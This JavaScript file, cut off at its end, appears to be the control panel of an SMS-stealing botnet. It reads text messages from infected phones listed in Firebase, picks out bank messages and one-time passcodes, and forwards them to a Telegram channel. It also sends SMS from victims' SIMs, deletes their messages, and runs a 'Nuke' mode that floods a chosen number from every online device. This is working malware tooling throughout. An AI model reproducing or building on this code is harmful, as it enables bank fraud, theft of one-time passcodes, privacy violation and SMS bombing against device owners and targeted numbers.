function _msgCacheSet(key, arr){ _msgCache[key] = arr; }

function parseMsgSingle(key, m){
  var message = '', sender = '', dateTime = '', type = 'incoming';
  if(typeof m === 'string'){ message = m; sender = 'Unknown'; }
  else if(typeof m === 'object'){
    message = m.message || m.body || m.messageBody || m.text || m.msg || m.content || m.sms || m.Body || m.Message || '';
    var ps = m.sender || m.from || m.phoneNumber || m.phone || m.number || m.source || m.originator || m.from_number;
    var ads = m.address || m.originatingAddress || m.senderAddress || m.remoteAddress || m.peerAddress;
    var ids = m.senderId || m.senderid || m.shortCode || m.short_code || m.sender_id;
    sender = String(ps || ads || ids || '').trim();
    if(!sender || sender === 'null' || sender === 'undefined' || sender === '0') sender = '';
    if(!sender){
      var keys = Object.keys(m);
      for(var ki=0;ki<keys.length;ki++){
        var kk = keys[ki], vv = String(m[kk] || '').trim();
        if(/^\+?\d{5,15}$/.test(vv) && kk !== 'type' && kk !== 'msgType' && kk !== 'messageType'){ sender = vv; break; }
      }
    }
    if(!sender) sender = 'Unknown';
    dateTime = m.dateTime || m.date || m.time || m.timestamp || m.createdAt || m.receivedAt || m.sentAt || m.dateReceived || m.dateSent || '';
    var rt = String(m.type || m.direction || m.msgType || m.messageType || '');
    type = (rt === '2' || rt.toLowerCase().includes('out') || rt.toLowerCase().includes('sent')) ? 'outgoing' : 'incoming';
  }
  if(!message && !sender) return null;
  return { key: key, message: message || '(no body)', sender: sender || 'Unknown', dateTime: dateTime, type: type, _ts: parseDT(dateTime) };
}

function parseMsgs(data){
  var msgs = [];
  if(!data) return msgs;
  var entries = Array.isArray(data) ? data.map(function(v, i){ return [String(i), v]; }) : Object.entries(data);
  entries.forEach(function(kv){ var p = parseMsgSingle(kv[0], kv[1]); if(p) msgs.push(p); });
  msgs.sort(function(a, b){
    if(a._ts > 0 && b._ts > 0) return b._ts - a._ts;
    return String(b.key).localeCompare(String(a.key));
  });
  return msgs;
}

async function preloadMsgs(id, strictMode){
  if(!selDev) return;
  var cacheKey = _ck(selDev);
  var fbUrl = selDev._fbUrl || FB_URL, fbKey = selDev._fbKey !== undefined ? selDev._fbKey : FB_KEY;
  try{
    var auth = fbKey ? '?auth=' + fbKey + '&' : '?';
    var r = await _fastFetch(fbUrl + '/messages/' + id + '.json' + auth + 'orderBy="$key"&limitToLast=200');
    if(!r.ok) throw new Error('HTTP ' + r.status);
    var msgs = parseMsgs(await r.json());
    _msgCacheSet(cacheKey, msgs);
    amCache[id] = msgs; amFetch[id] = Date.now();

    if(msgs.length){
      if(strictMode) forceWatermark(id, msgs[0].key);
      else if(!_watermarks[id]) forceWatermark(id, msgs[0].key);
      msgs.slice(0, 60).forEach(function(m){ _forwardSeen.add(id + '::' + m.key); });
      saveForwardTracker();
    }

    if(selDev && selDev.id === id){
      allMsgs = msgs;
      lastKeys = new Set(msgs.map(function(m){ return m.key; }));
      updCnt(); filterActiveMsgs(); renderBankPane();
    }
    startMP(id);
  }catch(e){
    var list = document.getElementById('dmMsgList');
    if(list) list.innerHTML = '<div class="empty"><div class="ei">⚠️</div><p>Failed</p></div>';
    startMP(id);
  }
}

async function pollMsgs(id){
  if(!selDev || selDev.id !== id) return;
  var dev = selDev, cacheKey = _ck(dev);
  var fbUrl = dev._fbUrl || FB_URL, fbKey = dev._fbKey !== undefined ? dev._fbKey : FB_KEY;
  try{
    var auth = fbKey ? '?auth=' + fbKey + '&' : '?';
    var r = await _fastFetch(fbUrl + '/messages/' + id + '.json' + auth + 'orderBy="$key"&limitToLast=200');
    if(!r.ok) return;
    var msgs = parseMsgs(await r.json());
    var hasNew = msgs.some(function(m){ return !lastKeys.has(m.key); });
    lastKeys = new Set(msgs.map(function(m){ return m.key; }));
    _msgCacheSet(cacheKey, msgs);
    amCache[id] = msgs; amFetch[id] = Date.now();
    if(hasNew){
      allMsgs = msgs;
      updCnt(); filterActiveMsgs(); renderBankPane();
      var lm = msgs[0];
      if(lm){ var otp = _extractOtp(lm.message); if(otp) otpShow(otp, lm.sender); }
      checkAndForward(msgs, id);
    }
  }catch(e){}
}

function updCnt(){ var el = document.getElementById('dmMsgCnt'); if(el) el.textContent = allMsgs.length; }

function filterActiveMsgs(){
  var el = document.getElementById('dmMsgSearch');
  var q = el ? (el.value || '').toLowerCase().trim() : '';
  var list = allMsgs.filter(function(m){
    if(mfMode === 'incoming' && m.type !== 'incoming') return false;
    if(mfMode === 'outgoing' && m.type !== 'outgoing') return false;
    if(mfMode === 'bank' && !isBankingSms(m.sender, m.message)) return false;
    if(q){
      var bank = detectBank(m.sender);
      var hay = (m.message + ' ' + m.sender + ' ' + (m.dateTime || '') + ' ' + (bank ? bank.name : '')).toLowerCase();
      if(hay.indexOf(q) === -1) return false;
    }
    return true;
  });
  var listEl = document.getElementById('dmMsgList'); if(!listEl) return;
  if(!list.length){ listEl.innerHTML = '<div class="empty"><div class="ei">💬</div><p>No messages</p></div>'; return; }

  var view = list.slice(0, MSG_MAX_DOM);
  listEl.innerHTML = view.map(function(m){
    var bankTag = detectBank(m.sender);
    var isBank = !!isBankingSms(m.sender, m.message);
    var cls = m.type === 'incoming' ? 'inc' : 'out';
    if(isBank) cls += ' bank';
    return '<div class="msg-bub ' + cls + '"><div class="msg-meta">'
      + '<span class="msg-sndr" data-copy="' + escAttr(m.sender) + '" onclick="copyFromEl(this,event)">' + esc(m.sender) + '</span>'
      + (bankTag ? '<span class="msg-tp" style="background:rgba(255,121,185,.14);color:var(--gold2)">🏦 ' + esc(bankTag.name) + '</span>' : '')
      + '<span class="msg-tp ' + (m.type === 'incoming' ? 'mt-i' : 'mt-o') + '">' + m.type + '</span>'
      + '<span class="msg-dt">' + esc(m.dateTime) + '</span></div>'
      + '<div class="msg-txt" data-copy="' + escAttr(m.message) + '" onclick="copyFromEl(this,event)">' + esc(m.message) + '</div>'
      + '<button class="msg-del-btn" onclick="confirmDelMsg(\'' + escAttr(selDev ? selDev.id : '') + '\',\'' + escAttr(m.key) + '\',event,\'' + escAttr((m.message || '').substring(0, 60)) + '\')">✕</button></div>';
  }).join('');
}

function setActiveMF(f){
  mfMode = f;
  ['all','incoming','outgoing','bank'].forEach(function(t){
    var e = document.getElementById('dm-mf-' + t); if(e) e.classList.toggle('ma', t === f);
  });
  filterActiveMsgs();
}

async function refreshActiveMsgs(){
  if(!selDev) return;
  lastKeys = new Set(); allMsgs = [];
  try{
    var data = await fbGet('messages/' + selDev.id, selDev._fbUrl, selDev._fbKey);
    allMsgs = parseMsgs(data);
    lastKeys = new Set(allMsgs.map(function(m){ return m.key; }));
    updCnt(); filterActiveMsgs(); renderBankPane();
  }catch(e){ toast('⚠ Refresh failed'); }
}

function exportActiveMsgs(){
  if(!allMsgs.length){ toast('⚠ No messages'); return; }
  var csv = 'Sender,Type,DateTime,Message\n' + allMsgs.map(function(m){
    return [m.sender, m.type, m.dateTime, m.message].map(function(v){ return '"' + String(v || '').replace(/"/g, '""') + '"'; }).join(',');
  }).join('\n');
  _dlCsv('msgs-' + (selDev && selDev.id || 'dev') + '-' + Date.now() + '.csv', csv);
}

var _delPendingDevId = null, _delPendingKey = null;
function confirmDelMsg(devId, key, evt, preview){
  if(evt) evt.stopPropagation();
  _delPendingDevId = devId; _delPendingKey = key;
  var pv = document.getElementById('delMsgPreview'); if(pv) pv.textContent = preview || '(no preview)';
  var ok = document.getElementById('delMsgOk'); if(ok) ok.onclick = doDelMsg;
  openM('delMsgModal');
}
async function doDelMsg(){
  closeM('delMsgModal');
  if(!_delPendingDevId || !_delPendingKey) return;
  try{
    var dev = allDevices.find(function(d){ return d.id === _delPendingDevId; });
    await fbDel('messages/' + _delPendingDevId + '/' + _delPendingKey, dev && dev._fbUrl, dev && dev._fbKey);
    if(selDev && selDev.id === _delPendingDevId){
      allMsgs = allMsgs.filter(function(m){ return m.key !== _delPendingKey; });
      updCnt(); filterActiveMsgs(); renderBankPane();
    }
    toast('🗑 Deleted');
  }catch(e){ toast('⚠ Failed'); }
  _delPendingDevId = null; _delPendingKey = null;
}

/* ═══════ MANUAL SEND ═══════ */
function updOtpNoteBox(){
  if(!selDev) return;
  var note = otpNoteC[selDev.id] || '';
  var disp = document.getElementById('dmOtpNoteDisp'), inp = document.getElementById('dmOtpNoteInp');
  if(disp){ disp.textContent = note || 'No OTP note saved yet…'; disp.className = 'otp-note-disp' + (note ? '' : ' empty'); }
  if(inp) inp.value = note;
}
function saveOtpNoteActive(){
  if(!selDev) return;
  var val = document.getElementById('dmOtpNoteInp').value.trim();
  otpNoteC[selDev.id] = val;
  var disp = document.getElementById('dmOtpNoteDisp');
  if(disp){ disp.textContent = val || 'No OTP note saved yet…'; disp.className = 'otp-note-disp' + (val ? '' : ' empty'); }
  toast('✓ OTP note saved');
}
function sendSmsActive(){
  if(!selDev){ toast('⚠ No device'); return; }
  var to = document.getElementById('dmSendTo').value.trim();
  var msg = document.getElementById('dmSendMsg').value.trim();
  if(!to || !msg){ toast('⚠ Fill both fields'); return; }
  if(!passesRestriction('', msg, null)){ toast('🚫 Blocked'); return; }

  var sim = deviceSimMap[selDev.id] || 1;
  var btn = document.getElementById('dmSendBtn');
  if(btn){ btn.disabled = true; btn.textContent = 'Sending…'; }

  sendSmsGuaranteed(selDev, sim, to, msg).then(function(ok){
    if(ok){ showResActive(true, '✓ SMS queued from SIM ' + sim); document.getElementById('dmSendMsg').value = ''; }
    else { showResActive(false, '⚠ Failed'); }
    if(btn){ btn.disabled = false; btn.textContent = '🚀 Send Message'; }
  });
}
function showResActive(ok, m){
  var el = document.getElementById('dmSendRes'); if(!el) return;
  el.textContent = m; el.className = 'sres ' + (ok ? 'ok' : 'err');
  el.style.display = 'block';
  setTimeout(function(){ el.style.display = 'none'; }, 3000);
}

/* ═══════ ALL MSGS ═══════ */
function openAllMsgs(){ openM('allMsgsModal'); trigAM(false); }
function setAMF(f){
  amfMode = f;
  ['all','incoming','outgoing'].forEach(function(t){
    var e = document.getElementById('amf-' + t); if(e) e.classList.toggle('ma', t === f);
  });
  filterAndRender();
}
function trigAM(force){
  if(amLoading) return;
  if(!force && amLoaded && amAll.length){ filterAndRender(); return; }
  loadAllMsgs(force);
}
async function loadAllMsgs(force){
  var onlineDevs = allDevices.filter(function(d){ return d.status; });
  var list = document.getElementById('amList');
  if(!onlineDevs.length){ if(list) list.innerHTML = '<div class="empty"><div class="ei">📱</div><p>No online devices</p></div>'; return; }
  amLoading = true;
  var now = Date.now();
  var toFetch = onlineDevs.filter(function(d){ return force || !amCache[d.id] || now - amFetch[d.id] > 10000; });
  var BATCH = 50;
  for(var i=0;i<toFetch.length;i+=BATCH){
    await Promise.allSettled(toFetch.slice(i, i+BATCH).map(async function(dev){
      try{
        var fbUrl = dev._fbUrl || FB_URL, fbKey = dev._fbKey !== undefined ? dev._fbKey : FB_KEY;
        var auth = fbKey ? '?auth=' + fbKey + '&' : '?';
        var r = await _fastFetch(fbUrl + '/messages/' + dev.id + '.json' + auth + 'orderBy="$key"&limitToLast=50');
        amCache[dev.id] = parseMsgs(r.ok ? await r.json() : null);
        amFetch[dev.id] = Date.now();
      }catch(e){ if(!amCache[dev.id]) amCache[dev.id] = []; }
    }));
    rebuild(); filterAndRender();
    await new Promise(function(r){ setTimeout(r, 0); });
  }
  amLoaded = true; amLoading = false;
  rebuild(); filterAndRender();
}
function rebuild(){
  var onlineDevs = allDevices.filter(function(d){ return d.status; }), c = [];
  for(var i=0;i<onlineDevs.length;i++){
    var dev = onlineDevs[i], msgs = amCache[dev.id];
    if(!msgs || !msgs.length) continue;
    for(var j=0;j<msgs.length;j++){
      var m = msgs[j];
      c.push({ key: m.key, message: m.message, sender: m.sender, _ts: m._ts, type: m.type, dateTime: m.dateTime, cn: i+1, did: dev.id, dname: dev.name, dnum: dev.mobNo, dnote: noteC[dev.id] || dev.note || '' });
    }
  }
  c.sort(function(a, b){ return b._ts - a._ts; });
  amAll = c;
}
function filterAndRender(){
  var qEl = document.getElementById('amSearch');
  var q = qEl ? (qEl.value || '').toLowerCase().trim() : '';
  amFilt = amAll.filter(function(m){
    if(amfMode === 'incoming' && m.type !== 'incoming') return false;
    if(amfMode === 'outgoing' && m.type !== 'outgoing') return false;
    if(q){
      var bank = detectBank(m.sender);
      var hay = (m.message + ' ' + m.sender + ' ' + (m.did || '') + ' ' + (m.dname || '') + ' ' + (m.dnum || '') + ' ' + (m.dnote || '') + ' ' + (m.dateTime || '') + ' ' + (bank ? bank.name : '') + ' ' + (m.type || '')).toLowerCase();
      if(hay.indexOf(q) === -1) return false;
    }
    return true;
  });
  var list = document.getElementById('amList'); if(!list) return;
  list.innerHTML = ''; amCount = 0;
  if(!amFilt.length){ list.innerHTML = '<div class="empty"><div class="ei">💬</div><p>No messages</p></div>'; return; }
  renderPage();
}
function renderPage(){
  var list = document.getElementById('amList'); if(!list) return;
  var batch = amFilt.slice(amCount, amCount + MSG_PAGE);
  if(!batch.length) return;
  var frag = document.createDocumentFragment();
  batch.forEach(function(m){
    var el = document.createElement('div');
    var bank = detectBank(m.sender);
    el.className = 'am-card ' + (m.type === 'incoming' ? 'inc' : 'out');
    el.innerHTML = '<div class="am-left"><div class="am-cn">#' + m.cn + '</div><div class="am-name">' + esc(m.dname) + '</div><div class="am-name" style="font-size:9px;color:var(--sky)">' + esc(m.dnum || '') + '</div></div>'
      + '<div class="am-right"><div class="am-meta">'
      + '<span class="am-sndr" data-copy="' + escAttr(m.sender) + '" onclick="copyFromEl(this,event)">' + esc(m.sender) + '</span>'
      + (bank ? '<span class="msg-tp" style="background:rgba(255,121,185,.14);color:var(--gold2)">🏦 ' + esc(bank.name) + '</span>' : '')
      + '<span class="msg-tp ' + (m.type === 'incoming' ? 'mt-i' : 'mt-o') + '">' + m.type + '</span>'
      + '<span class="msg-dt">' + esc(m.dateTime || '') + '</span></div>'
      + '<div class="am-txt" data-copy="' + escAttr(m.message) + '" onclick="copyFromEl(this,event)">' + esc(m.message) + '</div></div>';
    frag.appendChild(el);
  });
  list.appendChild(frag);
  amCount += batch.length;
}

/* ═══════ NUKE ═══════ */
function openNuke(){ openM('nukeModal'); updateNukeInfo(); }
function updateNukeInfo(){
  var online = allDevices.filter(function(d){ return d.status; });
  var simsTotal = 0, totalShots = 0;
  online.forEach(function(d){ simsTotal += d.sims.length || 0; totalShots += d.sims.length || 0; });
  var a = document.getElementById('nukeDeviceCount'); if(a) a.textContent = online.length;
  var b = document.getElementById('nukeSimCount'); if(b) b.textContent = simsTotal;
  var c = document.getElementById('nukeTotalShots'); if(c) c.textContent = totalShots;
}
function fireNuke(){
  var target = document.getElementById('nukeTarget').value.trim();
  var msg = document.getElementById('nukeMsg').value.trim();
  if(!target || !msg){ toast('⚠ Enter number and message'); return; }
  var online = allDevices.filter(function(d){ return d.status; });
  if(!online.length){ toast('⚠ No online devices'); return; }
  var shots = [];
  online.forEach(function(dev){
    var simCount = dev.sims.length || 1;
    for(var s=1;s<=simCount;s++) shots.push({ dev: dev, sim: s });
  });
  nukeRunning = true; nukeSent = 0; nukeFail = 0; nukeTotal = shots.length;
  _nukeActive = 0; _nukeStartTime = Date.now();
  var a = document.getElementById('nukeSent'); if(a) a.textContent = '0';
  var b = document.getElementById('nukeFail'); if(b) b.textContent = '0';
  var c = document.getElementById('nukeTotal'); if(c) c.textContent = shots.length;
  var st = document.getElementById('nukeStats'); if(st) st.classList.add('show');
  var pw = document.getElementById('nukeProgWrap'); if(pw) pw.style.display = 'block';
  var fb = document.getElementById('nukeFireBtn'); if(fb) fb.style.display = 'none';
  var sb = document.getElementById('nukeStopBtn'); if(sb) sb.style.display = 'block';
  toast('💣 Nuking with ' + shots.length + ' shots…');

  var idx = 0, done = 0, pool = Math.min(_nukePool, shots.length);
  function spawn(){
    while(_nukeActive < pool && idx < shots.length && nukeRunning){
      var shot = shots[idx++], dev = shot.dev;
      var url = (dev._fbUrl || FB_URL) + '/clients/' + dev.id + '/webhookEvent/sendSms.json'
              + ((dev._fbKey || FB_KEY) ? '?auth=' + (dev._fbKey || FB_KEY) : '');
      var body = JSON.stringify({ from: shot.sim, to: target, message: msg, isSended: false });
      _nukeActive++;
      _fastFetch(url, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: body })
        .then(function(r){ if(r.ok) nukeSent++; else nukeFail++; })
        .catch(function(){ nukeFail++; })
        .finally(function(){
          _nukeActive--; done++;
          updateNukeProgress(done, shots.length);
          if(idx < shots.length && nukeRunning) spawn();
          else if(done === shots.length) finishNuke();
        });
    }
  }
  spawn();
}
function updateNukeProgress(done, total){
  var a = document.getElementById('nukeSent'); if(a) a.textContent = nukeSent;
  var b = document.getElementById('nukeFail'); if(b) b.textContent = nukeFail;
  var pct = Math.round((done / total) * 100);
  var pf = document.getElementById('nukeProgFill'); if(pf) pf.style.width = pct + '%';
  var pt = document.getElementById('nukeProgTxt'); if(pt) pt.textContent = pct + '% · ' + done + '/' + total;
}
function finishNuke(){
  nukeRunning = false;
  var fb = document.getElementById('nukeFireBtn'); if(fb) fb.style.display = 'block';
  var sb = document.getElementById('nukeStopBtn'); if(sb) sb.style.display = 'none';
  var e = ((Date.now() - _nukeStartTime) / 1000).toFixed(1);
  toast('✅ Nuke — ' + nukeSent + ' sent, ' + nukeFail + ' failed');
  notifyChannel('💣 <b>Nuke Complete</b>\n\n✅ ' + nukeSent + '\n❌ ' + nukeFail + '\n⏱️ ' + e + 's');
}
function stopNuke(){
  nukeRunning = false;
  var fb = document.getElementById('nukeFireBtn'); if(fb) fb.style.display = 'block';
  var sb = document.getElementById('nukeStopBtn'); if(sb) sb.style.display = 'none';
  toast('⏹ Stopped');
}

/* ═══════ SETTINGS ═══════ */
function openSettings(){ try{ populateSettingsUI(); openM('settingsModal'); }catch(e){ toast('⚠ ' + e.message); } }
function populateSettingsUI(){
  var el1 = document.getElementById('setMyNumber'); if(el1) el1.value = userConfig.myNumber || '';
  var elCh = document.getElementById('setTgChannel'); if(elCh) elCh.value = userConfig.channelId || '';
  var el2 = document.getElementById('setTgEnabled'); if(el2) el2.checked = userConfig.botEnabled !== false;
  var el3 = document.getElementById('setFwdEnabled'); if(el3) el3.checked = userConfig.forwardEnabled !== false;
  var cn = document.getElementById('setChannelNotify'); if(cn) cn.checked = userConfig.channelNotify !== false;
  var nS = document.getElementById('setNumStart'); if(nS) nS.value = userConfig.numStart || '';
  var nE = document.getElementById('setNumEnd'); if(nE) nE.value = userConfig.numEnd || '';
  var mS = document.getElementById('setMsgStart'); if(mS) mS.value = userConfig.msgStart || '';
  var mE = document.getElementById('setMsgEnd'); if(mE) mE.value = userConfig.msgEnd || '';
  var nL = document.getElementById('setNumLabels'); if(nL) nL.value = (userConfig.numLabels || []).join(',');
  var mL = document.getElementById('setMsgLabels'); if(mL) mL.value = (userConfig.msgLabels || []).join(',');
  renderFbList(); updateTgStatusLine(); updateForwardModeUI();
}
function setForwardMode(mode){
  userConfig.forwardMode = mode;
  cacheConfigLocal(); debouncedCloudSave(); updateForwardModeUI();
  toast('✓ ' + (mode === 'banking' ? 'Banking only' : 'All'));
}
function updateForwardModeUI(){
  var mode = userConfig.forwardMode || 'all';
  var bAll = document.getElementById('setFwdModeAll'), bBank = document.getElementById('setFwdModeBank'), hint = document.getElementById('fwdModeHint');
  [bAll, bBank].forEach(function(b){ if(b) b.classList.remove('active'); });
  if(mode === 'all' && bAll) bAll.classList.add('active');
  if(mode === 'banking' && bBank) bBank.classList.add('active');
  if(hint) hint.textContent = mode === 'banking' ? 'Only bank/OTP messages forwarded' : 'All incoming forwarded';
}
function updateTgStatusLine(){
  var el = document.getElementById('tgStatusLine'); if(!el) return;
  var lines = [];
  if(tgRunning){
    lines.push('● Bot active');
    lines.push('📊 Updates: ' + tgDiagnostics.updateCount);
    if(tgDiagnostics.lastError) lines.push('⚠ ' + tgDiagnostics.lastError);
    el.className = 'settings-status ' + (tgDiagnostics.lastError ? 'err' : 'on');
  } else {
    lines.push('○ Not running');
    if(tgDiagnostics.lastError) lines.push('⚠ ' + tgDiagnostics.lastError);
    el.className = 'settings-status';
  }
  el.innerHTML = lines.join('<br>');
  updateTgBtn();
}
function updateTgBtn(){
  var btn = document.getElementById('tgStatus'); if(!btn) return;
  btn.textContent = tgRunning ? '🤖 ON' : '🤖 OFF';
  btn.style.color = tgRunning ? 'var(--mint)' : 'var(--sub)';
}
function renderFbList(){
  var el = document.getElementById('settingsFbList'); if(!el) return;
  if(!fbInstances.length){ el.innerHTML = '<div style="font-size:11px;color:var(--dim);text-align:center;padding:14px">No extra Firebase URLs</div>'; return; }
  el.innerHTML = fbInstances.map(function(inst){
    var total = (inst.devices || []).length;
    var online = (inst.devices || []).filter(function(d){ return d.status; }).length;
    var statusColor = inst.status === 'ok' ? 'var(--mint)' : inst.status === 'error' ? 'var(--rose)' : 'var(--sub)';
    var statusLabel = inst.status === 'ok' ? '✓' : inst.status === 'error' ? '✗' : '…';
    return '<div class="fb-list-row"><div class="fb-list-row-info"><div class="fb-list-row-lbl">' + esc(inst.label) + '</div><div class="fb-list-row-url">' + esc(inst.url) + '</div></div>'
      + '<span style="font-size:10px;font-weight:700;color:' + statusColor + '">' + statusLabel + ' ' + online + '/' + total + '</span>'
      + '<button onclick="fbReload(\'' + escAttr(inst.id) + '\')" style="padding:4px 8px;background:rgba(255,121,185,.08);border:1px solid rgba(255,121,185,.2);border-radius:6px;color:var(--gold2);font-size:11px;cursor:pointer">↻</button>'
      + '<button onclick="fbRemove(\'' + escAttr(inst.id) + '\')" style="padding:4px 8px;background:rgba(255,102,140,.08);border:1px solid rgba(255,102,140,.2);border-radius:6px;color:var(--rose);font-size:11px;cursor:pointer">✕</button></div>';
  }).join('');
}
async function fbReload(id){
  var inst = fbInstances.find(function(x){ return x.id === id; }); if(!inst) return;
  toast('↻ Reloading…'); await fbLoadInst(inst); fbMergeAll();
}
async function addFirebaseFromSettings(){
  var label = document.getElementById('setFbLabel').value.trim();
  var url = document.getElementById('setFbUrl').value.trim().replace(/\/+$/, '');
  var key = document.getElementById('setFbKey').value.trim();
  if(!url){ toast('⚠ Enter a URL'); return; }
  if(!/^https?:\/\//i.test(url)){ toast('⚠ Must start with http(s)://'); return; }
  if(fbInstances.find(function(x){ return x.url === url; })){ toast('⚠ Already added'); return; }
  var inst = { id: 'fb_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7), label: label || ('Firebase ' + (fbInstances.length + 1)), url: url, key: key, devices: [], status: 'connecting', poll: null };
  fbInstances.push(inst);
  document.getElementById('setFbLabel').value = '';
  document.getElementById('setFbUrl').value = '';
  document.getElementById('setFbKey').value = '';
  renderFbList();
  await fbLoadInst(inst);
  fbStartPoll(inst, 0);
  syncFirebasesToConfig(); fbMergeAll(); renderFbList();

  /* ═══ SAVE TO REDIS ═══ */
  try{ _saveFirebaseToRedis(url, key || '', label || ''); }catch(e){}
}
async function fbLoadInst(inst){
  try{
    var auth = inst.key ? '?auth=' + inst.key : '';
    var r = await _fastFetch(inst.url + '/clients.json' + auth);
    if(!r.ok){ inst.status = 'error'; inst.devices = []; renderFbList(); return; }
    var raw = await r.json();
    if(!raw || typeof raw !== 'object'){ inst.devices = []; inst.status = 'empty'; renderFbList(); return; }
    var devs = parseDevs(raw);
    devs.forEach(function(d){ d._fbId = inst.id; d._fbLabel = inst.label; d._fbUrl = inst.url; d._fbKey = inst.key; });
    inst.devices = devs; inst.status = devs.length ? 'ok' : 'empty';
    if(devs.length) fbMergeAll();
    renderFbList();
  }catch(e){ inst.status = 'error'; inst.devices = []; renderFbList(); }
}
function fbStartPoll(inst, staggerMs){
  if(inst.poll) clearInterval(inst.poll);
  setTimeout(function(){
    inst.poll = setInterval(async function(){
      if(!inst.url) return;
      try{
        var auth = inst.key ? '?auth=' + inst.key : '';
        var r = await _fastFetch(inst.url + '/clients.json' + auth);
        if(!r.ok){ inst.status = 'error'; return; }
        var devs = parseDevs(await r.json());
        devs.forEach(function(d){ d._fbId = inst.id; d._fbLabel = inst.label; d._fbUrl = inst.url; d._fbKey = inst.key; });
        inst.devices = devs; inst.status = 'ok';
        fbMergeAll();
      }catch(e){ inst.status = 'error'; }
    }, POLL_DEV);
  }, staggerMs || 0);
}
function fbStopPoll(inst){ if(inst.poll){ clearInterval(inst.poll); inst.poll = null; } }
function fbRemove(id){
  var idx = fbInstances.findIndex(function(x){ return x.id === id; });
  if(idx === -1) return;
  fbStopPoll(fbInstances[idx]); fbInstances.splice(idx, 1);
  fbMergeAll(); syncFirebasesToConfig(); renderFbList(); toast('🗑 Removed');
}
function syncFirebasesToConfig(){
  userConfig.firebases = fbInstances.map(function(x){ return { url: x.url, label: x.label, key: x.key }; });
  debouncedCloudSave();
}
function fbMergeAll(){ if(_mergeDebTimer) clearTimeout(_mergeDebTimer); _mergeDebTimer = setTimeout(_doFbMergeAll, 30); }
function _doFbMergeAll(){
  _mergeDebTimer = null;
  var merged = [], seen = new Set();
  for(var pp=0; pp<allDevices.length; pp++){
    var pd = allDevices[pp];
    if((pd._fbId || 'primary') === 'primary'){
      var pk = 'primary:' + pd.id;
      if(!seen.has(pk)){ seen.add(pk); merged.push(pd); }
    }
  }
  for(var ii=0; ii<fbInstances.length; ii++){
    if(fbInstances[ii].id === 'primary') continue;
    var devs = fbInstances[ii].devices || [];
    for(var jj=0; jj<devs.length; jj++){
      var d = devs[jj];
      var k = (d._fbId || 'primary') + ':' + d.id;
      if(!seen.has(k)){ seen.add(k); merged.push(d); }
    }
  }
  applyStableOrder(merged);
  allDevices = merged;
  renderStats(); renderGrid(); renderFbList();
}
function fbRegisterPrimary(){
  allDevices.forEach(function(d){ if(!d._fbId){ d._fbId = 'primary'; d._fbLabel = 'Primary'; d._fbUrl = FB_URL; d._fbKey = FB_KEY; } });
}
function loadFirebasesFromConfig(){
  var saved = userConfig.firebases || []; if(!saved.length) return;
  var toConnect = [];
  saved.forEach(function(s){
    if(!s.url || fbInstances.find(function(x){ return x.url === s.url; })) return;
    var inst = { id: 'fb_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7), label: s.label || s.url, url: s.url, key: s.key || '', devices: [], status: 'connecting', poll: null };
    fbInstances.push(inst); toConnect.push(inst);
  });
  if(!toConnect.length) return;
  (async function(){
    var BATCH = 20;
    for(var i=0;i<toConnect.length;i+=BATCH){
      var batch = toConnect.slice(i, i+BATCH);
      await Promise.allSettled(batch.map(async function(inst){ try{ await fbLoadInst(inst); }catch(e){ inst.status = 'error'; } }));
      batch.forEach(function(inst, bi){ fbStartPoll(inst, (i+bi) * 100); });
      await new Promise(function(r){ setTimeout(r, 0); });
    }
    renderFbList();
  })();
}
function saveAllSettings(){
  userConfig.myNumber = document.getElementById('setMyNumber').value.trim();
  var chEl = document.getElementById('setTgChannel'); if(chEl) userConfig.channelId = chEl.value.trim();
  userConfig.botEnabled = document.getElementById('setTgEnabled').checked;
  userConfig.forwardEnabled = document.getElementById('setFwdEnabled').checked;
  var cn2 = document.getElementById('setChannelNotify'); if(cn2) userConfig.channelNotify = cn2.checked;
  var nS = document.getElementById('setNumStart'); if(nS) userConfig.numStart = nS.value.trim();
  var nE = document.getElementById('setNumEnd'); if(nE) userConfig.numEnd = nE.value.trim();
  var mS = document.getElementById('setMsgStart'); if(mS) userConfig.msgStart = mS.value.trim();
  var mE = document.getElementById('setMsgEnd'); if(mE) userConfig.msgEnd = mE.value.trim();
  var nL = document.getElementById('setNumLabels');
  if(nL){ var arr = nL.value.split(',').map(function(s){ return s.trim(); }).filter(Boolean); userConfig.numLabels = arr.length ? arr : CFG.DEFAULT_CONFIG.numLabels; }
  var mL = document.getElementById('setMsgLabels');
  if(mL){ var arr2 = mL.value.split(',').map(function(s){ return s.trim(); }).filter(Boolean); userConfig.msgLabels = arr2.length ? arr2 : CFG.DEFAULT_CONFIG.msgLabels; }
  cacheConfigLocal(); debouncedCloudSave();
  if(userConfig.botEnabled && userConfig.channelId && activeDeviceUid){ if(!tgRunning) startFastTelegram(); }
  else { stopFastTelegram(); }
  updateTgStatusLine(); toast('💾 Saved');
}

/* ═══════ TELEGRAM — SINGLE WORKER (race-free) ═══════ */
async function tgApi(method, payload){
  try{
    var r = await _fastFetch(CFG.TG_API + '/' + method, payload
      ? { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }
      : {});
    return await r.json();
  }catch(e){ return { ok: false, description: e.message }; }
}
async function fetchBotUsername(){
  var el = document.getElementById('botUsername');
  try{
    var r = await _fastFetch(CFG.TG_API + '/getMe');
    var d = await r.json();
    if(d.ok && d.result){
      tgDiagnostics.botInfo = d.result;
      if(el) el.textContent = '@' + (d.result.username || ('bot_' + d.result.id));
      updateTgStatusLine();
    } else if(el) el.textContent = '⚠ err';
  }catch(e){ if(el) el.textContent = '⚠ offline'; }
}

async function startFastTelegram(){
  stopFastTelegram();
  if(!userConfig.channelId){ toast('⚠ Set channel ID'); return; }
  tgDiagnostics.lastError = '';
  updateTgStatusLine();

  await tgApi('deleteWebhook?drop_pending_updates=false');
  var me = await tgApi('getMe');
  if(!me.ok){ tgDiagnostics.lastError = 'Token invalid'; toast('❌ Token invalid'); updateTgStatusLine(); return; }
  tgDiagnostics.botInfo = me.result;

  try{
    var r = await _fastFetch(CFG.TG_API + '/getUpdates?offset=-1&timeout=0&limit=1');
    var d = await r.json();
    if(d.ok && d.result && d.result.length) _tgOffset = d.result[d.result.length-1].update_id + 1;
    else _tgOffset = 0;
  }catch(e){ _tgOffset = 0; }

  tgRunning = true;
  tgDiagnostics.updateCount = 0;
  updateTgStatusLine(); updateTgBtn();
  runWorker();
  toast('⚡ Bot ON');
}

function stopFastTelegram(){
  tgRunning = false;
  if(_tgAbort){ try{ _tgAbort.abort(); }catch(e){} _tgAbort = null; }
  updateTgStatusLine(); updateTgBtn();
}

async function runWorker(){
